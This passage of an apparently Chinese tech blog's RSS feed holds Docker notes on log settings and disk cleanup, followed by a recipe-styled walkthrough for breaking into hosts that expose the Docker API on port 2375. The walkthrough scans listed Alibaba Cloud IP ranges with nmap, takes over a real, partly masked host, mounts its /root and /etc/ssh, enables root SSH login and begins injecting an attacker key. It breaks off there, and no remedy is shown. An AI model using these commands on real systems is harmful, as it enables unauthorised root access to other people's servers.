      <guid>https://www.geekery.cn/note-book/Docker/Docker%E6%97%A5%E5%BF%97%E9%85%8D%E7%BD%AE%E5%AF%B9%E5%B7%B2%E8%BF%90%E8%A1%8C%E5%AE%B9%E5%99%A8%E4%B8%8D%E7%94%9F%E6%95%88.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker日志配置对已运行容器不生效</source>
      <description>Docker日志配置对已运行容器不生效 在/etc/docker/daemon.json中修改或添加log-opts参数 网上很多帖子都说了怎么做，但是发现少提了一句。 那就是已经创建了的容器，该选项的修改【重启daemon】是无法生效的。 我们来看官方文档： https://docs.docker.com/config/containers/logg...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>在/etc/docker/daemon.json中修改或添加log-opts参数</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"log-driver"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"json-file"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  "log-opts"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">{</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "max-size"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :"50m","max-file":"1"}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>网上很多帖子都说了怎么做，但是发现少提了一句。</p>
<h2><strong>那就是已经创建了的容器，该选项的修改【重启daemon】是无法生效的。</strong></h2>
<p><strong>我们来看官方文档：</strong></p>
<p><a href="https://docs.docker.com/config/containers/logging/configure/" target="_blank" rel="noopener noreferrer"><strong>https://docs.docker.com/config/containers/logging/configure/</strong></a></p>
<h2>检测方法</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inspect</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{{.HostConfig.LogConfig}}'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器名xxx</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker环境清理</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E7%8E%AF%E5%A2%83%E6%B8%85%E7%90%86.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E7%8E%AF%E5%A2%83%E6%B8%85%E7%90%86.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker环境清理</source>
      <description>Docker环境清理 开始清理，需要慎重！ 列出无用的卷 docker volume ls -qf dangling=true 清理无用的卷 docker volume rm $(docker volume ls -qf dangling=true) 清理无用的镜像 docker rmi $(docker images | grep &amp;apos;^&amp;lt;none&amp;gt;&amp;apos;...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p><strong>开始清理，需要慎重！</strong></p>
<p>列出无用的卷</p>
<blockquote>
<p>docker volume ls -qf dangling=true</p>
</blockquote>
<p>清理无用的卷</p>
<blockquote>
<p>docker volume rm $(docker volume ls -qf dangling=true)</p>
</blockquote>
<p>清理无用的镜像</p>
<blockquote>
<p>docker rmi $(docker images | grep '^&lt;none&gt;' | awk '{print $3}')</p>
</blockquote>
<p>继续清理</p>
<blockquote>
<p>docker system prune</p>
<p>docker volume prune</p>
</blockquote>
<p>以上足够使用，其他命令不要知道了！</p>
<p>**补充知识：**<strong>Docker 一文教你清理docker空间释放磁盘空间</strong></p>
<p><strong>如何清理docker目录</strong></p>
<p>docker 目录已经占满系统盘，又不好迁移，问下有没有快捷的解决方案，答案是有的。以下是我整理的经典案列，适合生产以及测试使用。编写清理docker 日志脚本如下：</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>[root@www ~]# cat clean_docker_log_space.log </span></span>
<span class="line"><span>#!/bin/bash</span></span>
<span class="line"><span>docker_log_files=$(find /var/lib/docker/containers/ -name '*-json.log')</span></span>
<span class="line"><span>docker_logs_size=$(find /var/lib/docker/containers/ -name '*-json.log' | xargs du -sc | tail -1 |awk '{print $1,"K"}')</span></span>
<span class="line"><span>free -h &amp;&amp; sync &amp;&amp; echo 1 &gt; /proc/sys/vm/drop_caches  #释放系统缓存</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>echo -e "\033[32mThe docker log total size is $docker_logs_size\033[0m"</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>for log in $docker_log_files</span></span>
<span class="line"><span>  do</span></span>
<span class="line"><span>   echo "Now is cleaning docker log,docker core logs:$log"</span></span>
<span class="line"><span>    cat /dev/null &gt; $log</span></span>
<span class="line"><span>    systemctl reload docker #加载docker服务，不影响已经docker</span></span>
<span class="line"><span>  done </span></span>
<span class="line"><span> </span></span>
<span class="line"><span>free -h</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行结果如下：</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>[root@www ~]# ./clean_docker_log_space.log </span></span>
<span class="line"><span>       total    used    free   shared buff/cache  available</span></span>
<span class="line"><span>Mem:      976M    598M    112M    6.8M    264M    157M</span></span>
<span class="line"><span>Swap:     511M     66M    445M</span></span>
<span class="line"><span>The docker log total size is 80 K</span></span>
<span class="line"><span>Now is cleaning docker log,docker core logs:/var/lib/docker/containers/7538f077348e3c9722fb90ed4b0a5c3d60d72112e989526767c63d55f5a76f3e/7538f077348e3c9722fb90ed4b0a5c3d60d72112e989526767c63d55f5a76f3e-json.log</span></span>
<span class="line"><span>Now is cleaning docker log,docker core logs:/var/lib/docker/containers/235d20190027e757a203f1b4d4093335fb92ba515f7a501448c36c1332c622a2/235d20190027e757a203f1b4d4093335fb92ba515f7a501448c36c1332c622a2-json.log</span></span>
<span class="line"><span>Now is cleaning docker log,docker core logs:/var/lib/docker/containers/685a7af447ce884de1e9bbeb5d4ca0ca99860096f71c33b4f9a4d15a427c5e00/685a7af447ce884de1e9bbeb5d4ca0ca99860096f71c33b4f9a4d15a427c5e00-json.log</span></span>
<span class="line"><span>       total    used    free   shared buff/cache  available</span></span>
<span class="line"><span>Mem:      976M    599M    176M    6.8M    200M    168M</span></span>
<span class="line"><span>Swap:     511M     66M    445M</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>[root@www ~]# find /var/lib/docker/containers/ -name '*-json.log' | xargs du -sc | tail -1 |awk '{print $1,"K"}'</span></span>
<span class="line"><span>0 K</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>建议把脚本加Linux 定时任务里面每周清理一次，这个就可以保证docker 不产生而外的日志文件。</p>
<p><strong>生产环境如下所示</strong></p>
<p>df -TH docker 使用系统磁盘的93%</p>
<p></p>
<p>执行脚本 clean_docker_log_space.log ，执行清理脚本之后df -TH，docker 使用系统磁盘的43%</p>
<p></p>
<p><strong>docker部署建议</strong></p>
<p>最后建议大家在部署docker 的应用建议在docker自定义配置目录</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#首先，挂载容量的磁盘，挂载目录选择/data</span></span>
<span class="line"><span>[root@www ~]# mkdir -p /data</span></span>
<span class="line"><span>#停止docker</span></span>
<span class="line"><span>[root@www ~]# systemctl stop docker</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>#将数据移到新目录</span></span>
<span class="line"><span>[root@www ~]# mv /var/lib/docker /data</span></span>
<span class="line"><span>#修改配置,增加 --graph /data</span></span>
<span class="line"><span>[root@www ~]# vim /usr/lib/systemd/system/docker.service</span></span>
<span class="line"><span>ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --graph /data </span></span>
<span class="line"><span> </span></span>
<span class="line"><span>[root@www ~]# systemctl daemon-reload</span></span>
<span class="line"><span>[root@www ~]# systemctl start docker </span></span>
<span class="line"><span>[root@www ~]# systemctl enable docker.service </span></span>
<span class="line"><span>Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker的2375攻击和解决方案</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E7%9A%842375%E6%94%BB%E5%87%BB%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E7%9A%842375%E6%94%BB%E5%87%BB%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker的2375攻击和解决方案</source>
      <description>Docker的2375攻击和解决方案 相信了解过docker remote API的同学对2375端口都不陌生了，2375是docker远程操控的默认端口，通过这个端口可以直接对远程的docker daemon进行操作。 当$HOST主机以**docker daemon -H=0.0.0.0:2375**方式启动daemon时，可以在外部机器对 $HO...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>相信了解过<a href="https://so.csdn.net/so/search?q=docker&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">docker</a> remote API的同学对2375端口都不陌生了，2375是docker远程操控的默认端口，通过这个端口可以直接对远程的docker daemon进行操作。</p>
<p>当$HOST主机以**<code>docker daemon -H=0.0.0.0:2375</code>**方式启动daemon时，可以在外部机器对 $HOST 的docker daemon进行直接操作：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp://</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$HOST</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:2375</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>好，说说如何“入侵”，怎么通过这个端口入侵宿主机呢？</p>
<p>这个应该要从几个点说起吧：</p>
<ul>
<li>
<ol>
<li>docker对<code>user namespace</code>没有做隔离，也就是说，容器内部的root用户就是宿主机的root用户，一旦挂载目录，就可以在容器内部以宿主机的root用户身份对挂载的文件系统随意修改了。</li>
</ol>
</li>
<li>
<ol>
<li>docker服务拥有很高的执行权利(相当于root)，并且在docker用户组下的普通用户不需要任何其他验证就可以执行docker run等命令。</li>
</ol>
</li>
<li>
<ol start="2">
<li>暴露的docker remote  API端口如果没有启动ssl验证的话，任何能连通到这台docker宿主机的的机器都可以随意操作这台docker宿主机的docker  daemon（docker run、docker ps、docker rm等等这些命令都不在话下）。</li>
</ol>
</li>
</ul>
<p>结合以上3点，就基本具备入侵docker宿主机的条件了</p>
<p>讲得似乎有点悬，不多说，直接拿一个活鲜鲜的例子来讲吧：</p>
<p>(请允许我用最近新学的一道菜将流程带过 ╮(￣▽￣)╭ )</p>
<h3>秘制红烧肉(docker版)</h3>
<p>材料：一整块一整块的“5花”IP段，越肥越好（小白用户越多越好）</p>
<p>配料：nmap，docker</p>
<p>step 1: 扫描2375端口</p>
<p>怎么扫？我选用的是简单易用的黑客必备神器<code>nmap</code>了。</p>
<p>扫哪里呢？我选的目标是aliyun的IP段，百度得知：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">42.96.128.0/17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    Alibaba</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (Beijing) Technology Co., Ltd. China  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">42.120.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    Aliyun</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Computing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Co.,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LTD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> China</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">42.121.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    Aliyun</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Computing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Co.,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LTD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> China</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">42.156.128.0/17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    Aliyun</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Computing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Co.,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LTD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> China</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">110.75.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    Asia</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Pacific</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Information</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Centre</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> China</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">223.7.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    Hangzhou</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Alibaba</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Advertising</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Co.,Ltd.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我不生产IP，我只是百度的搬运工，别问我这些IP从那来，我也想知道~ &gt;.&lt;</p>
<p>将上面IP内容保存在一个文件中，如 aliyun.list</p>
<p>开始扫描：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aliyun.list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">| </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{print $1}'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">xargs</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -n</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -I</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p2375</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {}</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 简单解释一下命令：</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># awk 将第一列IP网段过滤出来</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># xargs 将过滤出来的IP一个一个的分次送给nmap，-I {} 是指使用{}来代替传送的参数</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ...</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Starting Nmap 7.01 ( https://nmap.org ) at 2016-06-05 09:57 CST</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Nmap scan report for 42.96.MOSAIC.MOSAIC</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Host is up (0.070s latency).</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># PORT     STATE SERVICE</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 2375/tcp open  docker</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ...</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>不到两分钟，第一块<code>42.96.MOSAIC.MOSAIC</code>（五花肉已打码） “五花肉”选好了，来吧~</p>
<h3>step 2: 测试2375的直接控制权</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp://42.96.MOSAIC.MOSAIC:2375</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># CONTAINER ID        IMAGE                              COMMAND                  CREATED            STATUS             PORTS           </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 73aa690e7c92        imdjh/owncloud-with-ocdownloader   "/entrypoint.sh"         9 days ago          Up 3 days           0.0.0.0:9009-&gt;80</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># f57c56af0e29        rethinkdb:2.3.2                    "rethinkdb --bind all"   9 days ago          Up 3 days           8080/tcp, 28015/</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 37c1401db593        gaomd/ikev2-vpn-server:0.3.0       "/bin/sh -c /usr/bin/"   10 days ago         Up 3 days           0.0.0.0:500-&gt;500</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># af7338a5426d        nginx:1.9-alpine                   "nginx -g 'daemon off"   3 weeks ago         Up 3 days           443/tcp, 0.0.0.0</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ...</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个服务器的owner也太配合了(⊙ο⊙)，ps直接看到内容，说明这个主机的2375是没有ssl验证的，基本满足入侵要求。</p>
<p>“五花”洗好，切好，准备下锅~</p>
<h3>step 3: 远程启动自己的容器</h3>
<p>拿到了docker的控制权能做什么呢？ <strong>拿到了就呵呵了~</strong></p>
<div class="language-r line-numbers-mode" data-highlighter="shiki" data-ext="r" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-r"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># images 看看本地已有的镜像</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># docker -H tcp://42.96.MOSAIC.MOSAIC:2375 images</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ...</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># swarm                              latest              47dc182ea74b        4 weeks ago         19.32 MB</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># jwilder/nginx-proxy                latest              203b20631e41        4 weeks ago         255.6 MB</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ubuntu                             latest              c5f1cf30c96b        4 weeks ago         120.8 MB</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># shipyard/shipyard                  latest              ba426f0944bc        5 weeks ago         58.92 MB</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ...</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>省略了一部分输出，镜像还蛮多的，就选个ubuntu吧</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># docker -H tcp://42.96.MOSAIC.MOSAIC:2375 run --rm -it --entrypoint bash -v /root:/tmp/root -v /etc/ssh:/tmp/ssh_etc -v /var/log:/tmp/log ubuntu</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>看到这步，相信对ssh有一些了解的同学应该就明白了</p>
<h3>step 4: ssh pub key 注入</h3>
<p>在刚刚启动的容器中先看看 <code>/tmp/ssh_etc/sshd_config</code> (就是宿主机的<code>/etc/ssh/sshd_config</code>) 的PermitRootLogin字段。如果是<code>no</code>就改成<code>yes</code>，允许root通过ssh登录</p>
<p>然后在<strong>你的机器上</strong>生成一对新的pub key（已经有ssh key的也建议生成一个新的，不要使用自己日常使用的ssh pub key）</p>
<div class="language-perl line-numbers-mode" data-highlighter="shiki" data-ext="perl" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-perl"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 使用 ssh-keygen生成</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ssh-keygen -t rsa -C </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"hello</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">@</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">world</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.com"</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 执行命令后的提示Enter file in which to save the key要看好，不要把自己的ssh key覆盖了，可以选着/tmp/id_rsa</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 其他提示enter到底即可</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>继续，注入ssh pub key，回到<strong>刚刚启动的容器</strong>执行</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt;&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/tmp/root/.ssh/authorized_keys</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
